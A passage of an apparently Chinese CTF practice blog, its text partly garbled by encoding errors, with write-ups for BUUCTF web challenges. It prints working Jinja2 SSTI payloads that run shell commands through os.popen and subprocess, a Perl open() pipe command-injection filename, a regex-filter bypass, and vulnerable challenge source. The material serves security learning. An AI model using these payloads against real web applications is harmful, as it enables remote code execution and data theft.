src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184319466.png" alt="image-20211021184319466"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184415617.png" alt="image-20211021184415617"></p><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>ä¸€çœ¼sstiï¼Œç„¶åå°±ä¸ä¼šäº†ï¼ˆ</p><p>f12çœ‹åˆ°æºç æ³¨é‡Šï¼Œgetæ–¹å¼ï¼Œå‚æ•°ä¸ºsearch</p><p>è¯•ä¸€ä¸‹ä¼ <code>&#123;&#123;7*7&#125;&#125;</code>ç¡®å®šæ˜¯ssti</p><pre class="language-none"><code class="language-none">config ä¹Ÿæ˜¯ Flaskæ¨¡ç‰ˆä¸­çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡,å®ƒåŒ…å«äº†æ‰€æœ‰åº”ç”¨ç¨‹åºçš„é…ç½®å€¼ã€‚&#123;&#123; config.items() &#125;&#125;    &#x2F;&#x2F; æŸ¥çœ‹é…ç½®é¡¹ç›®çš„ä¿¡æ¯  </code></pre><p><code>&#123;&#123;(()|select|string)[24]~(()|select|string)[24]~(()|select|string)[15]~(()|select|string)[20]~(()|select|string)[6]~(()|select|string)[18]~(()|select|string)[18]~(()|select|string)[24]~(()|select|string)[24]&#125;&#125; </code></p><p>ä¾‹ä¸€ï¼š<br>warnings.catch_warningsç±»</p><pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;</code></pre><p>PSï¼šç”±äºä½¿ç”¨[â€˜globalsâ€™]ä¼šé€ æˆ500çš„æœåŠ¡å™¨é”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”å½“æˆ‘ç›´æ¥è¾“å…¥search=globalsæ—¶é¡µé¢ä¹Ÿä¼š500ï¼Œè§‰å¾—è¿™é‡Œåº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨äº†å­—ç¬¦ä¸²æ‹¼æ¥çš„å½¢å¼[â€˜gloâ€™+&#39;balsâ€™]</p><p>æœ€åè·å–flag</p><pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125;   </code></pre><p>ä¾‹äºŒï¼š</p><pre class="language-none"><code class="language-none">classâ€™site._Printerâ€™ç±»&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</code></pre><p>è·å–flag</p><pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125;</code></pre><p>ä¾‹ä¸‰ï¼š<br>popen</p><pre class="language-none"><code class="language-none">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;)&#125;&#125;</code></pre><h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>è¿›å»åæ˜¯phpä»£ç </p><p>ç›´æ¥æŠ„çš„å…¶ä»–å¸ˆå‚…çš„æ³¨é‡Š</p><pre class="language-none"><code class="language-none">&lt;?php    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);  &#x2F;&#x2F; explode(separator,string)å‡½æ•°æŠŠä»¥separatorä¸ºåˆ†éš”å­—ç¬¦ä¸²å°†å­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ã€‚        $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0];    &#125;    echo $_SERVER[&quot;REMOTE_ADDR&quot;];    $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);   &#x2F;&#x2F; â€œREMOTE_ADDRâ€ä¸ºæ­£åœ¨æµè§ˆå½“å‰é¡µé¢ç”¨æˆ·çš„ IP åœ°å€ã€‚     @mkdir($sandbox);    @chdir($sandbox);     &#x2F;&#x2F; æ”¹å˜å½“å‰çš„ç›®å½•åˆ°$sandbox    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));     &#x2F;&#x2F; escapeshellarg()æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);  &#x2F;&#x2F; pathinfo() å‡½æ•°ä»¥æ•°ç»„çš„å½¢å¼è¿”å›æ–‡ä»¶è·¯å¾„çš„ä¿¡æ¯ã€‚    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));   &#x2F;&#x2F; basename() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚    @mkdir($dir);    @chdir($dir);    @file_put_contents(basename($info[&quot;basename&quot;]), $data);    highlight_file(__FILE__);    &#x2F;&#x2F; ä»¥ä¸Šä»£ç å¤§è‡´ä¸ºï¼Œè°ƒç”¨GETï¼ˆgitï¼‰å‘½ä»¤æ¥æ‰§è¡Œä»urlè·å–çš„å‚æ•°ï¼Œä»è¯¥urlè·å–å†…å®¹ï¼Œ ç„¶åæŒ‰ç…§filenameæ–°å»ºæ–‡ä»¶ï¼Œå†™å…¥gitåˆ°çš„ç»“æœã€‚</code></pre><p>ç®€å•æ¥è¯´å°±æ˜¯åˆ©ç”¨ä¼ å‚ä¸­çš„urlæ‰§è¡Œå‘½ä»¤ï¼Œç„¶åå°†ç»“æœä¿å­˜åœ¨filenameä¸­</p><p>æœ‰å‡ ä¸ªåœ°æ–¹ä¸å¤ªæ‡‚</p><p>â€‹    1.ç™¾åº¦çš„wpéƒ½è¯´è¿™é‡Œåˆ©ç”¨çš„perlè„šæœ¬é‡Œçš„openæ¼æ´</p><pre class="language-none"><code class="language-none">åˆ©ç”¨GETä¸­çš„openå‡½æ•°æ¼æ´ã€‚openå‡½æ•°åœ¨GETå‘½ä»¤è¢«è°ƒç”¨æ—¶æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ç¬¬äº”è¡Œæ‰§è¡ŒGETå‘½ä»¤æ—¶ï¼Œperlè¯­è¨€ä¼šè°ƒç”¨openå‘½ä»¤ï¼Œæ¼æ´å°±å­˜åœ¨äºopenå‘½ä»¤å¯¹äºæ–‡ä»¶çš„å¤„ç†ä¸Šï¼Œå…³äºè¿™ä¸ªæ¼æ´ï¼Œå¤–å›½äººæœ‰æ–‡ç« ï¼Œæ˜¯è¿™æ ·å†™çš„ï¼šPerl saw that your â€œfileâ€ ended with a â€œpipeâ€ (verticalbar) character. So it interpreted the â€œfileâ€ as a command to be executed, and interpreted the commandâ€™s output as the â€œfileâ€&#39;s contents. The command is â€œwhoâ€ (which prints information on currently logged-in users). If you execute that command, you will see that the output is exactly what the Perl program gave you.ç¿»è¯‘è¿‡æ¥æ„æ€æ˜¯perlå‡½æ•°çœ‹åˆ°è¦æ‰“å¼€çš„æ–‡ä»¶åä¸­å¦‚æœä»¥ç®¡é“ç¬¦ï¼ˆé”®ç›˜ä¸Šé‚£ä¸ªç«–æ ï¼‰ç»“å°¾ï¼Œå°±ä¼šä¸­æ–­åŸæœ‰æ‰“å¼€æ–‡ä»¶æ“ä½œï¼Œå¹¶ä¸”æŠŠè¿™ä¸ªæ–‡ä»¶åå½“ä½œä¸€ä¸ªå‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶ä¸”å°†å‘½ä»¤çš„æ‰§è¡Œç»“æœä½œä¸ºè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹å†™å…¥ã€‚è¿™ä¸ªå‘½ä»¤çš„æ‰§è¡Œæƒé™æ˜¯å½“å‰çš„ç™»å½•è€…ã€‚å¦‚æœä½ æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œä½ ä¼šçœ‹åˆ°perlç¨‹åºè¿è¡Œçš„ç»“æœã€‚</code></pre><p>â€‹    2.è¿™é‡Œæ‰§è¡Œurlä¼ å…¥çš„å‘½ä»¤çš„å‰ææ˜¯è¦æ±‚æœ‰ä¸ªä»¥è¯¥å‘½ä»¤å‘½åçš„æ–‡ä»¶</p><p>?url=/&amp;filename=1.txt çœ‹ä¸€ä¸‹æ ¹ç›®å½•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211103205139421.png" alt="image-20211103205139421"></p><p>æœ‰ä¸¤ä¸ªå’Œflagæœ‰å…³çš„æ–‡ä»¶ï¼Œè¯•flagæ— æœï¼Œåªèƒ½è¯•è¯•readflag</p><p>?url=&amp;filename=bash -c /readflag|</p><p>å…ˆåˆ›å»ºä¸€ä¸ªbash -c /readflag|çš„æ–‡ä»¶</p><p>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</p><p>åˆ©ç”¨urlæ‰§è¡Œå‘½ä»¤</p><p>/sandbox/md5å€¼/bash -c /readflag|</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211103205748482.png" alt="image-20211103205748482"></p><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002530209.png" alt="image-20211115002530209"></p><p>jsonæ ¼å¼</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002559767.png" alt="image-20211115002559767"></p><p>cmd</p><p>å¯ä»¥çŒœåˆ°æ‰§è¡Œå‘½ä»¤æ ¼å¼æ˜¯</p><p>{&quot;cmd&quot;:&quot;ls&quot;}</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002808993.png" alt="image-20211115002808993"></p><p>è¿˜å¯ä»¥ç›´æ¥getå‚æ•°è¿›å»</p><p>ä½†æ˜¯catå‚æ•°æ²¡æ³•ç›´æ¥ç”¨ï¼Œè¿˜æœ‰è¿‡æ»¤ï¼Œä¸è¿‡å¯ä»¥ç”¨æ¢è¡Œç¬¦ç»•è¿‡è¿‡æ»¤</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpputenv(&#39;PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail&#39;);è®¾ç½®äº†ç¯å¢ƒå˜é‡çš„PATHï¼Œå¯¼è‡´ä¸èƒ½ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œåªèƒ½ç”¨ç»å¯¹è·¯å¾„ï¼šif (isset($_REQUEST[&#39;cmd&#39;])) &#123;    $json &#x3D; $_REQUEST[&#39;cmd&#39;];if (!is_string($json)) &#123;    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;&#125; elseif (preg_match(&#39;&#x2F;^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\&#x2F;;-@\[-&#96;|~\x7F]+).*$&#x2F;&#39;, $json)) &#123;    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;&#125; else &#123;    echo &#39;Attempting to run command:&lt;br&#x2F;&gt;&#39;;    $cmd &#x3D; json_decode($json, true)[&#39;cmd&#39;];    if ($cmd !&#x3D;&#x3D; NULL) &#123;        system($cmd);    &#125; else &#123;        echo &#39;Invalid input&#39;;    &#125;    echo &#39;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;&#125;&#125;?&gt;</code></pre><p>catå‘½ä»¤ä¸èƒ½ç›´æ¥ç”¨ï¼ŒåŸå› å¯èƒ½æ˜¯å½“å‰çš„PATHä¸‹æ²¡æœ‰catï¼Œè¿™é‡Œéœ€è¦ä¹Ÿéœ€è¦ç”¨ç»å¯¹è·¯å¾„ï¼š</p><blockquote><p><a href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=Linux">Linux</a>å‘½ä»¤çš„ä½ç½®ï¼š/bin,/usr/binï¼Œé»˜è®¤éƒ½æ˜¯å…¨ä½“ç”¨æˆ·ä½¿ç”¨ï¼Œ/sbin,/usr/sbin,é»˜è®¤rootç”¨æˆ·ä½¿ç”¨</p></blockquote><p>cat è¯»å‡ºæºç ï¼ˆæˆ‘ä¹Ÿå¾ˆæƒ³çŸ¥é“ç½‘ä¸Šçš„wpæ²¡æºç ä¹‹å‰æ€ä¹ˆæƒ³åˆ°è¿™ä¹ˆç»•è¿‡çš„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115003758590.png" alt="image-20211115003758590"></p><p>ç„¶åæ‰¾flagåœ¨çš„ç›®å½•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115003933107.png" alt="image-20211115003933107"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115004010321.png" alt="image-20211115004010321"></p><p>æ‰¾åˆ°ä¹‹ååˆ©ç”¨catè¯»å‡ºæ¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115004044237.png" alt="image-20211115004044237"></p><h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>æ³¨å†Œä¸ªè´¦å·ï¼Œç™»å½•ï¼Œçœ‹åˆ°æœ‰ä¸ªgetflagä½†æ˜¯æç¤ºæƒé™ä¸å¤Ÿ</p><p>æŸ¥çœ‹æºç å‘ç°å…¨æ˜¯jsçš„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122204752692.png" alt="image-20211122204752692"></p><p>çœ‹ä¸€ä¸‹app.js</p><pre class="language-none"><code class="language-none">&#x2F;** *  æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶ *  è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD *&#x2F;function login() &#123;    const username &#x3D; $(&quot;#username&quot;).val();    const password &#x3D; $(&quot;#password&quot;).val();    const token &#x3D; sessionStorage.getItem(&quot;token&quot;);    $.post(&quot;&#x2F;api&#x2F;login&quot;, &#123;username, password, authorization:token&#125;)        .done(function(data) &#123;            const &#123;status&#125; &#x3D; data;            if(status) &#123;                document.location &#x3D; &quot;&#x2F;home&quot;;            &#125;        &#125;)        .fail(function(xhr, textStatus, errorThrown) &#123;            alert(xhr.responseJSON.message);        &#125;);&#125;function register() &#123;    const username &#x3D; $(&quot;#username&quot;).val();    const password &#x3D; $(&quot;#password&quot;).val();    $.post(&quot;&#x2F;api&#x2F;register&quot;, &#123;username, password&#125;)        .done(function(data) &#123;            const &#123; token &#125; &#x3D; data;            sessionStorage.setItem(&#39;token&#39;, token);            document.location &#x3D; &quot;&#x2F;login&quot;;        &#125;)        .fail(function(xhr, textStatus, errorThrown) &#123;            alert(xhr.responseJSON.message);        &#125;);&#125;function logout() &#123;    $.get(&#39;&#x2F;api&#x2F;logout&#39;).done(function(data) &#123;        const &#123;status&#125; &#x3D; data;        if(status) &#123;            document.location &#x3D; &#39;&#x2F;login&#39;;        &#125;    &#125;);&#125;function getflag() &#123;    $.get(&#39;&#x2F;api&#x2F;flag&#39;).done(function(data) &#123;        const &#123;flag&#125; &#x3D; data;        $(&quot;#username&quot;).val(flag);    &#125;).fail(function(xhr, textStatus, errorThrown) &#123;        alert(xhr.responseJSON.message);    &#125;);&#125;</code></pre><p>æç¤ºæ˜¯åŸºäºNode.jsçš„koaæ¡†æ¶ï¼Œä½†æ˜¯è¿™ä¸ªé¡µé¢çš„ä»£ç å¹¶ä¸æ˜¯é€»è¾‘ä»£ç ï¼Œç”¨å¤„ä¸å¤§ã€‚<br>åœ¨æ³¨é‡Šé‡Œæç¤ºé™æ€æ–‡ä»¶å¤„ç†å‡ºç°é—®é¢˜ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šå‡ºç°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p><p>è¿™é‡Œéœ€è¦å¯¹koaæ¡†æ¶çš„ç›®å½•æœ‰ä¸€å®šçš„äº†è§£</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122205026873.png" alt="image-20211122205026873"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873007950084a1a7b518c2216100ff330f7ed7a6.png" alt="img"></p><p>è®¿é—®ä¸€ä¸‹controllersè·¯å¾„ä¸‹çš„api.js</p><p>é¢ï¼Œè¿™é‡Œèµµæ€»è¯´æ˜¯ç»éªŒã€‚ã€‚ã€‚</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token keyword">const</span> APIError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../rest'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>APIError<span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'POST /api/register'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'register error'</span><span class="token punctuation">,</span> <span class="token string">'wrong username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">100000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            global<span class="token punctuation">.</span>secrets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> secretid <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>secretid<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>algorithm<span class="token operator">:</span> <span class="token string">'HS256'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            token<span class="token operator">:</span> token        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">'POST /api/login'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'username or password is necessary'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> ctx<span class="token punctuation">.</span>header<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>authorization<span class="token punctuation">;</span>        <span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>sid <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> sid <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span>sid <span class="token operator">&lt;</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> sid <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'no such secret id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>algorithm<span class="token operator">:</span> <span class="token string">'HS256'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> status <span class="token operator">=</span> username <span class="token operator">===</span> user<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> user<span class="token punctuation">.</span>password<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            status        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">'GET /api/flag'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'permission error'</span><span class="token punctuation">,</span> <span class="token string">'permission denied'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> flag <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            flag        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">'GET /api/logout'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            status<span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token 